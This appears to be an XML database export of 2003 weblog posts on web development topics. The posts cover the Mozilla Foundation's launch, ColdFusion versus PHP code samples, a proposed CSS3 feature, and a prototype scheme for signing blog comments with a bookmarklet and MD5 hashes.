&lt;p&gt;Thankfully the Mozilla project will continue under the wings of the Mozilla Foundation, a new non-profit organisation headed up by the leaders of the current Mozilla project. The &lt;a href=&quot;http://www.mozilla.org/press/mozilla-foundation.html&quot; title=&quot;Mozilla Foundation Announcement&quot;&gt;press release&lt;/a&gt; has the details: AOL have pledged $2,000,000 over the next two years, Mitch Kapor (of the &lt;acronym title=&quot;Open Source Application Foundation&quot;&gt;OSAF&lt;/acronym&gt;) has donated $300,000 and Red Hat and Sun Microsystems are planning to follow suit. The foundation have a &lt;a href=&quot;http://www.mozillafoundation.org/&quot; title=&quot;Mozilla Foundation&quot;&gt;new site&lt;/a&gt;, which is mirrored on &lt;a href=&quot;http://www.mozilla.org/&quot;&gt;Mozilla.org&lt;/a&gt; (and surprisingly still uses a layout table).&lt;/p&gt;

&lt;p&gt;Now more than ever, the web standards movement needs to make itself heard. With Netscape dead, less enlightened web developers may be tempted to drop all pretences at cross browser compatibility and go back to targeting Internet Explorer. This would be a folly: even without Netscape, the browser ecosystem is thriving now more than any time before in the history of the web. The browser wars are dead and gone, and with due attention to standards they need never come back. Let's hope this truth is not lost in the media barrage we can expect over the next few weeks.&lt;/p&gt;</field>
		<field name="created">2003-07-15 23:49:56</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1097</field>
		<field name="title">New PHP experiment, inspired by ColdFusion</field>
		<field name="slug">phpAndColdFusion</field>
		<field name="body">&lt;p&gt;I've been reading up on ColdFusion MX recently, and I have to admit it looks like a really nice piece of technology. I'd previously written ColdFusion off as being too simplistic and primitive, but having seen how much its capable of I'm reconsidering my position.&lt;/p&gt;

&lt;p&gt;If you've never seen ColdFusion before, it's a server side scripting language/application server from Macromedia (who obtained it when they bought Allaire). MX is the latest version of the language, which sees it completely rewritten in Java to allow it to integrate with Java application servers and existing Java servlet applications. This is shrewd marketing on the part of Macromedia, and I've already seen them advertising it as something to make your existing Java web deployments easier to customise.&lt;/p&gt;

&lt;p&gt;The thing that put me off ColdFusion originally is that it is a tag-based scripting language, specifically designed to make it easy for &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; developers with little or no previous programming experience to pick up. Here's an example of a chunk of &lt;acronym title=&quot;ColdFusion&quot;&gt;CF&lt;/acronym&gt; syntax:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;cfml&quot;&gt;
&amp;lt;cfinclude template=&quot;some-other-file.cfm&quot;&amp;gt;

&amp;lt;cfif isdefined(&quot;form.name&quot;)&amp;gt;
 &amp;lt;cfoutput&amp;gt;
Hi there, #form.name#
 &amp;lt;/cfoutput&amp;gt;
&amp;lt;/cfif&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The thing that most surprised me about ColdFusion is that although the above syntax looks pretty verbose, it is actually designed in a way that means you can do an awful lot with very little code. The above in &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; would look like this:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;php&quot;&gt;
&amp;lt;?php
include('some-other-file.php');
if (isset($form['name'])) {
    print &quot;Hi there, $form['name']&quot;;
}
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;It's less typing, but only by a bit. Where &lt;acronym title=&quot;ColdFusion&quot;&gt;CF&lt;/acronym&gt; gets really clever though is with its handling of &lt;acronym title=&quot;Structured Query Language&quot;&gt;SQL&lt;/acronym&gt;. Here's the code to run a &lt;acronym title=&quot;Structured Query Language&quot;&gt;SQL&lt;/acronym&gt; query and loop through outputting the results to a simple table:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;cfml&quot;&gt;
&amp;lt;cfquery name=&quot;users&quot; datasource=&quot;myDSN&quot;&amp;gt;
select name, email from users order by name
&amp;lt;/cfquery&amp;gt;
&amp;lt;table&amp;gt;
&amp;lt;cfoutput query=&quot;users&quot;&amp;gt;
&amp;lt;tr&amp;gt;
 &amp;lt;td&amp;gt;#name#&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;#email#&amp;lt;/td&amp;gt;
&amp;lt;/tr&amp;gt;
&amp;lt;/cfoutput&amp;gt;
&amp;lt;/table&amp;gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Here's the same in &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt;, assuming $db contains a connection to a MySQL database.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;php&quot;&gt;
&amp;lt;?php
$result = mysql_query(&quot;select name, email from users order by name&quot;, $db);
echo '&amp;lt;table&amp;gt;';
while ($row = mysql_fetch_assoc($result)) {
    echo &quot;&amp;lt;tr&amp;gt;
  &amp;lt;td&amp;gt;$row['name']&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;{$row['email']}&amp;lt;/td&amp;gt;
&amp;lt;/tr&amp;gt;&quot;;
}
echo '&amp;lt;/table&amp;gt;';
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The ColdFusion example achieves the same effect but with less complicated code.&lt;/p&gt;

&lt;p&gt;ColdFusion is not without its problems: it comes with a price tag, and it encourages mixing application logic with presentation code (although as with &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; this can be avoided through discipline and careful application design). Never the less, I found it interesting enough that last night I spent a few hours putting together a &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; implementation of a couple of ColdFusion concepts. As with many of the experiments I post here this is very much experimental code - I won't be supporting it and I would not recommend using it for anything more than casual experimentation. Anyway, here it is:&lt;/p&gt;

&lt;ul&gt;
 &lt;li&gt;&lt;a href=&quot;http://simon.incutio.com/code/php/phpcf/templatetest.php&quot;&gt;Recent Entries&lt;/a&gt; (the output of the example script)&lt;/li&gt;
 &lt;li&gt;Example script's &lt;a href=&quot;http://simon.incutio.com/code/php/phpcf/templatetest.php.txt&quot;&gt;source code&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://simon.incutio.com/code/php/phpcf/TemplateParser.class.php.txt&quot;&gt;TemplateParser class&lt;/a&gt; (does all the work)&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://simon.incutio.com/code/php/phpcf/templates/recent.xml&quot;&gt;XML Template file&lt;/a&gt; used by the example script&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;With a bit more development, something like this could be a useful tool for quick-and-dirty &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; scripts that simply pull data out of MySQL and display it as &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt;. I still prefer &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt;, but ColdFusion has a lot of good ideas which are well worth knowing about.&lt;/p&gt;</field>
		<field name="created">2003-07-17 09:58:53</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1098</field>
		<field name="title">The Google Browser</field>
		<field name="slug">theGoogleBrowser</field>
		<field name="body">&lt;p&gt;Anil Dash &lt;a href=&quot;http://www.dashes.com/anil/index.php?archives/006726.php&quot; title=&quot;Upon the demise of Netscape&quot;&gt;suggests Google should start sponsoring the Mozilla project&lt;/a&gt;, and use it as a basis for releasing their own browser. He makes a very good case:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.dashes.com/anil/index.php?archives/006726.php&quot;&gt;&lt;p&gt;
Firebird is, finally, a usable browser, and damn close to the being the best in the world, if it isn't already. Google's shown the ability to get an installable client onto millions of desktops around the world. And they have a user experience focus that would nicely shore up the critical weakness that's dogged Mozilla from day one. If the goal is now organizing and presenting information instead of just being the best search engine, then a browser client focused on information retrieval, search, and management is a great first step. And I'd give them better than even odds at being able to grow that application into a full microcontent client if they were so inclined.
&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;The Google toolbar is a runaway success, but could a Google browser be nearly as popular? Google seem to be in the ideal position to launch a browser: they are one of the most popular and trusted brands on the internet, and have a reputation for usability which fits brilliantly with the focus of the Firebird browsers. Mozilla advocates such as myself have long bemoaned the fact that far better browsers exist which the &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt; using public are completley unaware of. Google have the marketing coverage and the influence to help them discover the alternatives.&lt;/p&gt;

&lt;p&gt;What's in it for Google? Anil suggests built in hooks to Google's services and APIs, evolving in to a fully fledged microcontent client. I think the biggest advantage is the huge boost a well promoted alternative browser would give to the overall health of the internet. Without competition to drive it forward &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt; has stagnated, and the web has stopped moving forward. Introduce &quot;Firebird, Google edition&quot; to the mix and things suddenly get interesting again.&lt;/p&gt;

&lt;p&gt;Oh, and just think of the cool things Google could do with &lt;acronym title=&quot;XML User interface Language&quot;&gt;XUL&lt;/acronym&gt;.&lt;/p&gt;

&lt;h4&gt;Further Thoughts (updated 11:27am)&lt;/h4&gt;

&lt;p&gt;With Microsoft's &lt;a href=&quot;http://www.wired.com/news/business/0,1367,58323,00.html&quot; title=&quot;Microsoft Covets Google&amp;apos;s Niche&quot;&gt;recent announcements&lt;/a&gt; that they plan to compete seriously with Google in the search market, this idea becomes even more relevant. Microsoft have a history of using the dominance in one area to win market share in another (they are after all a convicted monopoly). If they're planning a big push on Microsoft Search you can bet they'll use Internet Explorer to help them get it - it already defaults to searching MSN if you enter words straight in to the location bar. If &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt; retains its market dominance, Google will be competing on Microsoft's turf, and &lt;acronym title=&quot;MicroSoft&quot;&gt;MS&lt;/acronym&gt; don't have a very good history of playing fair. With their own cross-platform browser, Google will be in a far stronger tactical position.&lt;/p&gt;
</field>
		<field name="created">2003-07-17 11:09:14</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1099</field>
		<field name="title">Lots to come</field>
		<field name="slug">lotsToCome</field>
		<field name="body">&lt;p&gt;Warning: I'm back from Germany with a back-log of blog postings as long as my arm.&lt;/p&gt;</field>
		<field name="created">2003-07-22 16:17:59</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1100</field>
		<field name="title">Second year exam results</field>
		<field name="slug">secondYearExamResults</field>
		<field name="body">&lt;p&gt;I finally got my exam results for this semester through today. The exam results are great (three 73%s and a 76% for Graphics, which was my weakest subject!) but my average is pulled down quite a bit by my coursework marks, which include a hugely disappointing  50% for the big group software project. I ended up averaging 69.8% for the whole of the second year, which is 0.2% off a First. Hopefully I can do that tiny bit better in the final year.&lt;/p&gt;</field>
		<field name="created">2003-07-22 16:18:49</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1101</field>
		<field name="title">The Art of Unix Programming</field>
		<field name="slug">aoup</field>
		<field name="body">&lt;p&gt;Eric Raymond's &lt;a href=&quot;http://www.catb.org/~esr/writings/taoup/&quot;&gt;Art of Unix Programming&lt;/a&gt; is due for publication in August 2003. From skimming the &lt;a href=&quot;http://www.catb.org/~esr/writings/taoup/html/&quot; title=&quot;The Art of Unix Programming (HTML)&quot;&gt;online manuscript&lt;/a&gt; it looks like it could establish itself as a classic text book. It's also going to be &lt;em&gt;long&lt;/em&gt; - there's no way I can stomach reading it from a screen so I guess I'll have to wait until the dead tree version arrives.&lt;/p&gt;</field>
		<field name="created">2003-07-22 16:19:42</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1102</field>
		<field name="title">PyNewbie Tutorials</field>
		<field name="slug">pyNewbieTutorials</field>
		<field name="body">&lt;p&gt;Rob Hudson is publishing a series of short Python tutorials explaining language features and standard modules as he teaches himself the language. Articles so far cover &lt;a href=&quot;http://www.cogit8.org/rob/log/archives/000016.html&quot; title=&quot;PyNewbie on Using Sockets in Python&quot;&gt;Sockets&lt;/a&gt; and &lt;a href=&quot;http://www.cogit8.org/rob/log/archives/000017.html&quot; title=&quot;PyNewbie on making cryptograms&quot;&gt;making cryptograms&lt;/a&gt; using the random module.&lt;/p&gt;</field>
		<field name="created">2003-07-22 16:20:53</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1103</field>
		<field name="title">Scripting Open Office with Python</field>
		<field name="slug">scriptingOpenOffice</field>
		<field name="body">&lt;p&gt;The &lt;a href=&quot;http://udk.openoffice.org/python/python-bridge.html&quot;&gt;Python-UNO bridge&lt;/a&gt; for Open Office 1.1 allows you to script &lt;acronym title=&quot;Open Office&quot;&gt;OO&lt;/acronym&gt; using Python. At first glance, it seems to work a bit like Windows &lt;acronym title=&quot;Component Object Model &quot;&gt;COM&lt;/acronym&gt;, which can be accessed from Python using Mark Hammond's excellent &lt;a href=&quot;http://starship.python.net/crew/mhammond/&quot; title=&quot;Mark Hammond&amp;apos;s Python for Windows Extensions&quot;&gt;Win32 extensions&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2003-07-22 16:22:05</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1104</field>
		<field name="title">Python Advocacy from Bruce Eckel</field>
		<field name="slug">bruceEckel</field>
		<field name="body">&lt;p&gt;Bruce Eckel is turning in to the world's number one Python advocate. He explains his views on Python on his Weblog in &lt;a href=&quot;http://mindview.net/WebLog/log-0036&quot;&gt;Python Answers&lt;/a&gt;, elaborates further on the Python productivity boost in the &lt;a href=&quot;http://www.artima.com/intv/tipping.html&quot; title=&quot;Python and the Tipping Point - A Conversation with Bruce Eckel, Part IV&quot;&gt;fourth part&lt;/a&gt; of his Artima.com conversation, and discusses Python (amongst other topics) in an &lt;a href=&quot;http://community.borland.com/article/0,1410,30139,00.html&quot; title=&quot;Interview with Bruce Eckel by Clay Shannon&quot;&gt;interview&lt;/a&gt; on the Borland Developer Network. In the latter, he has this to say about Python in education:&lt;/p&gt;

&lt;blockquote cite=&quot;http://community.borland.com/article/0,1410,30139,00.html&quot;&gt;&lt;p&gt;
For me, I find it's more powerful to understand concepts than particular languages. Of course, you do have to understand languages in order to have implementations, but if I were designing a computer curriculum, I would teach Python first so that people could easily acquire depth in concepts, and then much later introduce languages like Java, C++ and C#, after they had reached the point of not getting confused by details. I think students could acquire the important skills much more quickly that way, and it would make a better use of their time. I'm not alone in this idea; there are more than a few college professors who feel the same way.
&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;I'd love to see Python taught at &lt;a href=&quot;http://www.bath.ac.uk/&quot; title=&quot;The University of Bath&quot;&gt;Bath&lt;/a&gt;, where I am convinced that the hassle involved in writing and executing simple Java programs is putting many students off developing their programming skills.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://mindview.net/WebLog/log-0038&quot;&gt;The Ideal Programmer&lt;/a&gt; on Bruce's weblog is also worth a read; it touches upon the idea that 5% of programmers are 20 times productive than the rest, and asks how disinterested programmers can be encouraged to write better code.&lt;/p&gt;</field>
		<field name="created">2003-07-22 16:23:08</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1105</field>
		<field name="title">Scott Andrew on Typepad</field>
		<field name="slug">delimiter</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://scott.typepad.com/delimiter/&quot;&gt;Delimiter&lt;/a&gt; is Scott Andrew's new TypePad blog. Unlike his &lt;a href=&quot;http://www.scottandrew.com/&quot;&gt;primary blog&lt;/a&gt; which mostly talks about his adventures as a musician, Delimiter &lt;a href=&quot;http://scott.typepad.com/delimiter/2003/07/this_is_delimit.html&quot; title=&quot;This is Delimiter&quot;&gt;promises&lt;/a&gt; to cover &lt;q cite=&quot;http://scott.typepad.com/delimiter/2003/07/this_is_delimit.html&quot;&gt;fun and interesting Web stuff&lt;/q&gt;. Should be good. Congratulations to Scott for his &lt;a href=&quot;http://scott.typepad.com/delimiter/2003/07/northbound.html&quot; title=&quot;Northbound&quot;&gt;new job at Amazon&lt;/a&gt; as well.&lt;/p&gt;

&lt;p&gt;Despite still officially being in beta, I've seen quite a few links to TypePad blogs cropping up. Thanks to blo.gs, you can get a list of all of them(?) by &lt;a href=&quot;http://blo.gs/?q=typepad&quot;&gt;searching for typepad&lt;/a&gt;.&lt;/p&gt;
</field>
		<field name="created">2003-07-22 16:32:38</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1106</field>
		<field name="title">A feature request for CSS3</field>
		<field name="slug">featureRequest</field>
		<field name="body">&lt;p&gt;One of the niggles I have with &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; 2 is that I frequently have to define colours multiple times. Consider this blog: I use orange in several places (as a background to the header, a border around the sidebar and a background to the sidebar h3 elements). Should I decide to change the shade of orange, or change it to another colour, I would have to alter my stylesheet in several places.&lt;/p&gt;

&lt;p&gt;A nice addition for &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; 3 would be the ability to define &quot;constants&quot; for colours (and maybe for other types as well, although I can't think of any that need them off the top of my head). It would be extremely convenient to define a bunch of colour constants at the top of a stylesheet and then refer to them elsewhere. For example:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;css&quot;&gt;
@define {
  colour_1: orange;
  colour_2: navy;
  colour_3: #f00;
}

/* later in the stylesheet ... */

h3 {
  background-color: &amp;amp;colour_1;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;That way, changing the @define block at the top of the sheet would change the colour of any element referring to a constant. I'm sure there are much better alternatives for the syntax, but the above should at least make the concept clear.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Update:&lt;/strong&gt; It has been pointed out &lt;a href=&quot;http://simon.incutio.com/archive/2003/07/22/featureRequest#comment4&quot;&gt;in the comments&lt;/a&gt; that this has been discussed before on the www-style mailing list but rejected for a number of reasons (see &lt;a href=&quot;http://lists.w3.org/Archives/Public/www-style/2003Jun/0072.html&quot; title=&quot;author-defined color aliases&quot;&gt;this thread&lt;/a&gt;). Aah well.&lt;/p&gt;</field>
		<field name="created">2003-07-22 18:09:27</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1107</field>
		<field name="title">BuyMusic, the latest sharecropper on the block</field>
		<field name="slug">secondClassCitizens</field>
		<field name="body">&lt;p&gt;As seen on &lt;a href=&quot;http://www.deftone.com/blogzilla/archives/buymusic_or_not.html&quot; title=&quot;BuyMusic... or not&quot;&gt;Blogzilla&lt;/a&gt; and &lt;a href=&quot;http://www.ordinary-life.net/blog/archives/002105.php&quot; title=&quot;Still Not Getting It&quot;&gt;Ordinary Life&lt;/a&gt;, &lt;a href=&quot;http://www.buymusic.com/ierequired.htm&quot;&gt;BuyMusic&lt;/a&gt; are content to exist as a sharecropper. It looks like the restriction is due to their use of Windows Media as the format for their &lt;acronym title=&quot;Digital Rights Management&quot;&gt;DRM&lt;/acronym&gt; protected files (BuyMusic is the Windows poor relative to Apple's iTunes). Unfortunately, this could become common place in the next few years as the music industry tries to find ways of surviving in the digital age. After all, with more than 90% of PCs running Windows there's no doubting that's where most of the money is. I guess the music industry are happy to be &lt;a href=&quot;http://tbray.org/ongoing/When/200x/2003/07/12/WebsThePlace&quot; title=&quot;The Web&amp;apos;s the Place&quot;&gt;sharecroppers&lt;/a&gt;, and anyone who choses non-Microsoft software will have to get used to being treated as second-class citizens.&lt;/p&gt;</field>
		<field name="created">2003-07-22 19:52:13</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1108</field>
		<field name="title">Signing comments on blogs</field>
		<field name="slug">signingComments</field>
		<field name="body">&lt;p&gt;Adrian Holovaty has implemented &lt;a href=&quot;http://www.holovaty.com/blog/archive/2003/07/22/0211&quot; title=&quot;New weblog feature: Reserved comment names&quot;&gt;reserved comment names&lt;/a&gt; in his blog, a feature that prevents anyone apart from him from using the names &quot;Adrian&quot;, &quot;Adrian H.&quot; or &quot;Adrian Holovaty&quot; when posting a comment. François Nonnenmacher suggests &lt;a href=&quot;http://www.padawan.info/trusted_comments.html&quot; title=&quot;Trusted comments&quot;&gt;extending the idea&lt;/a&gt; to allow people to &quot;confirm&quot; their authorship of comments on any blog using a TrackBack sent to their site that in turn causes them to be sent an alert email, which they can then use to confirm their comment. I like his idea of authentication based on &lt;acronym title=&quot;Uniform Resource Locator&quot;&gt;URL&lt;/acronym&gt;s (email addresses are no good; they should not be publically displayed for fear of spam harvesters) but I think I've come up with an alternative authentication scheme that removes the need for the user to manually confirm authorship. This is pretty complicated, so bare with me.&lt;/p&gt;

&lt;ol&gt;
 &lt;li&gt;The comment author enter's their comment in to a form on the site. They see a standard icon indicating that the blog in question supports comment signing. Rather than manually entering their name and &lt;acronym title=&quot;Uniform Resource Locator&quot;&gt;URL&lt;/acronym&gt;, they activate a bookmarklet that they have previously added to their browser.&lt;/li&gt;
 &lt;li&gt;The bookmarklet fills in the name and &lt;acronym title=&quot;Uniform Resource Locator&quot;&gt;URL&lt;/acronym&gt; fields for them. It also takes the comment, appends a secret key (stored in the bookmarklet) and finds the MD5 hash of the new string, using the &lt;a href=&quot;http://pajhome.org.uk/crypt/md5/index.html&quot;&gt;Javascript MD5 library&lt;/a&gt;. It inserts this hash in to a hidden field in the comment form.&lt;/li&gt;
 &lt;li&gt;The user can now submit the new comment. That's all they have to do.&lt;/li&gt;
 &lt;li&gt;The weblog server now kicks in to action. If the comment has not been signed (there is no hash in the hidden field) it adds the comment normally, noting that it should be displayed as an &quot;unsigned&quot; comment on the comments page. End of story.&lt;/li&gt;
 &lt;li&gt;If it &lt;em&gt;has&lt;/em&gt; been signed, the server has some work to do. First it must start loading the &lt;acronym title=&quot;Uniform Resource Locator&quot;&gt;URL&lt;/acronym&gt; indicated by the user on the comment form. It is looking for a &lt;code&gt;&amp;lt;link rel=&quot;signature&quot;&amp;gt;&lt;/code&gt; element, which will provide the &lt;acronym title=&quot;Uniform Resource Locator&quot;&gt;URL&lt;/acronym&gt; of a signature authenticating web service. If the &amp;lt;/head&amp;gt; tag is reached, the system can assume the link element does not exist and can mark the comment as &quot;unsigned&quot;,&lt;/li&gt;
 &lt;li&gt;If the web service is found, the server can now send it the comment and the User's site &lt;acronym title=&quot;Uniform Resource Locator&quot;&gt;URL&lt;/acronym&gt;. The web service (which knows the user's secret key) will respond with a hash created in the same way as the one constructed by the bookmarklet.&lt;/li&gt;
 &lt;li&gt;If the hash returned by the web service matches the hash provided by the bookmarklet, the comment is considered &quot;signed&quot;. The server can store it as such, and later display it with an icon or style that indicates it is a signed comment. If they do not match, the server can either store the comment as &quot;unsigned&quot; or even flag it as &quot;untrusted&quot;, since it was incorrectly signed.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;As you can see, it's a relatively complicated system. The comment authors must have a custom bookmarklet and add a tag to their home page indicating their authenticating web service &lt;acronym title=&quot;Uniform Resource Locator&quot;&gt;URL&lt;/acronym&gt;. Note that they do &lt;em&gt;not&lt;/em&gt; need to host the authentication web service themselves - they can instead point to one run by someone else who they trust (trust here is essential as the web service must know the user's private key). Meanwhile, the blogging system needs to be able to perform &lt;acronym title=&quot;HyperText Transfer Protocol&quot;&gt;HTTP&lt;/acronym&gt; requests.&lt;/p&gt;

&lt;p&gt;The key advantage of my system is that, being based on MD5, it is relatively easy to implement (as opposed to a system based on something like &lt;acronym title=&quot;Pretty Good Privacy&quot;&gt;PGP&lt;/acronym&gt;). Provided no one points out any immediate flaws, I would happily construct a prototype in &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt;. I'm sure a Perl implementation for Moveable Type users would not prove much of a challenge to any talented plugin author.&lt;/p&gt;

&lt;p&gt;Security wise, it strikes me that the weakest link is the client side bookmarklet which comment authors would need to use. However, comment signing is not the most critical security application in the world and comment authors could easily change their password by updating their bookmarklet and alerting their signature web-service provider (which could even be themselves) of the change.&lt;/p&gt;

&lt;p&gt;And if the signature idea doesn't win any favour, the idea of having a bookmarklet to fill in your name and &lt;acronym title=&quot;Uniform Resource Locator&quot;&gt;URL&lt;/acronym&gt; in blog comment forms is one I've been meaning to share for some time.&lt;/p&gt;</field>
		<field name="created">2003-07-22 21:10:50</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1109</field>
		<field name="title">You can't keep a good man down</field>
		<field name="slug">johnRobb</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://jrobb.mindplex.org/2003/07/20.html#a3342&quot;&gt;John Robb&lt;/a&gt;: &lt;q&gt;&lt;strong&gt;NEVER&lt;/strong&gt; (under any circumstances) publish a weblog to a domain that you don't control&lt;/q&gt;. Nice to see he's back.&lt;/p&gt;</field>
		<field name="created">2003-07-22 21:31:45</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1110</field>
		<field name="title">Mozilla 1.5a and Firebird 0.6.1</field>
		<field name="slug">mozilla15a</field>
		<field name="body">&lt;p&gt;Mozilla 1.5 alpha is now &lt;a href=&quot;http://www.mozilla.org/releases/&quot; title=&quot;Releases&quot;&gt;available for download&lt;/a&gt; from Mozilla.org. &lt;a href=&quot;http://www.mozilla.org/releases/mozilla1.5a/README.html&quot; title=&quot;What&amp;apos;s New in Mozilla 1.5 Alpha&quot;&gt;Changenotes here&lt;/a&gt; (it looks like mostly improvements to Composer, but the ability to jump from the javascript debugger straight to the view source line in question could be handy). Asa is &lt;a href=&quot;http://weblogs.mozillazine.org/asa/archives/003740.html&quot; title=&quot;firebird 0.6.1 rsn&quot;&gt;promising a new Firebird release&lt;/a&gt; soon:&lt;/p&gt;

&lt;blockquote cite=&quot;http://weblogs.mozillazine.org/asa/archives/003740.html&quot;&gt;&lt;p&gt;
We're planning on doing a Firebird release based on the Mozilla 1.5a branch. This isn't going to be Firebird 0.7 since we haven't met our goals for features and fixes but we think it's important to get the autocomplete crash fix (and a few other fixes) into the hands of all the people currently using 0.6.
&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;Some of the comments attached to Asa's post argue against releasing a new build based on the 1.5a Mozilla code. Personally I'm looking forward to the autocomplete crash fix in an official build as opposed to just the nightlies.&lt;/p&gt;</field>
		<field name="created">2003-07-23 15:46:59</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1111</field>
		<field name="title">Comment Authentication Prototype</field>
		<field name="slug">commentAuthenticationPrototype</field>
		<field name="body">&lt;p&gt;I've built a prototype of the comment signature system &lt;a href=&quot;http://simon.incutio.com/archive/2003/07/22/signingComments&quot; title=&quot; Signing comments on blogs&quot;&gt;discussed earlier&lt;/a&gt;. The prototype consists of an authentication server which anyone can register with and support on this blog for verifying signatures. So far it seems to work.&lt;/p&gt;

&lt;p&gt;To gain the ability to sign comments:&lt;/p&gt;

&lt;ol&gt;
 &lt;li&gt;Add the following &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; to the head section of your homepage/weblog: &lt;code class=&quot;html&quot;&gt;&amp;lt;link rel=&quot;sigserver&quot; href=&quot;http://simon.incutio.com/auth/confirm&quot; /&amp;gt;&lt;/code&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://simon.incutio.com/auth/register&quot;&gt;Create&lt;/a&gt; a comment authorisation account.&lt;/li&gt;
 &lt;li&gt;Log in to your authorisation account and add the bookmarklet it provides you with to your browser.&lt;/li&gt;
 &lt;li&gt;You can now sign a comment on this site (and any others that support the prototype) using the bookmarklet. You must activate it while looking at the entry page containing the 'Add Comment' form. The site will do the rest. Note that the bookmarklet will fill in the name, email and url fields on the form, saving you the hassle.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;To add support for comment authentication to your own blog (assuming it uses &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt;):&lt;/p&gt;

&lt;ol&gt;
 &lt;li&gt;Grab this file: &lt;a href=&quot;http://simon.incutio.com/auth/code/sig-confirm.inc.php.txt&quot;&gt;sig-confirm.inc.php&lt;/a&gt;. It contains a function which can be used to confirm a signature. It requires IXR, which you can download from &lt;a href=&quot;http://scripts.incutio.com/xmlrpc/&quot; title=&quot;The Incutio XML-RPC Library&quot;&gt;here&lt;/a&gt;.&lt;/li&gt;
 &lt;li&gt;Make some minor modifications to your 'add comment' form, to make it compatible with the bookmarklet. You need to assign ID attributes to the input fields for name, email and URL of 'commentFormName', 'commentFormEmail' and 'commentFormURL' respectively. You also need to add a hidden field like this one: &lt;code class=&quot;html&quot;&gt;&amp;lt;input type=&quot;hidden&quot; name=&quot;signature&quot; id=&quot;commentSignature&quot; value=&quot;&quot; /&amp;gt;&lt;/code&gt;&lt;/li&gt;
 &lt;li&gt;Modify the code that processes the add comment form. If 'signature' is not an empty string, the comment has been signed so confirm the signature by calling the confirmSig() function (documentation of the arguments is included in the sig-confirm.inc.php file). If the function returns true, flag the comment as signed. I suggest doing this by saving the  signature variable along with the rest of the comment.&lt;/li&gt;
 &lt;li&gt;When displaying comments, be sure to visually indicate comments that are &quot;signed&quot;.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;The system is decentralised, so if you want to host your own authentication server rather than relying on mine feel free to grab &lt;a href=&quot;http://simon.incutio.com/auth/code/&quot;&gt;the PHP code&lt;/a&gt; (warning: it's a bit of a mess) and use it as a starting point.&lt;/p&gt;

&lt;p&gt;This is more of a proof of concept than anything else, so feedback and suggestions would be very welcome.&lt;/p&gt;

